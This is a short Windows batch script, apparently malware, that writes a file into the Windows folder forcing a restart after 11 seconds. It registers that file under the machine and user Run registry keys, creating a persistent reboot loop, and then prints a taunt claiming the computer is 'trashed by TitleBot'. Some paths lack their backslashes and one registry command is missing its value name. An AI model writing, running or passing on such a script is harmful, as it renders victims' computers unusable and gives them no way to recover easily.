echo @echo off>C:Windowshartlell.bat
echo break off>>C:Windowshartlell.bat
echo shutdown -r -t 11 -f>>C:Windowshartlell.bat
echo end>>C:Windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d C:Windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d C:Windowshartlell.bat /f
echo You're Nailed, Buy A New Computer, Computer Trashed By TitleBot, On GitHub.
PAUSE
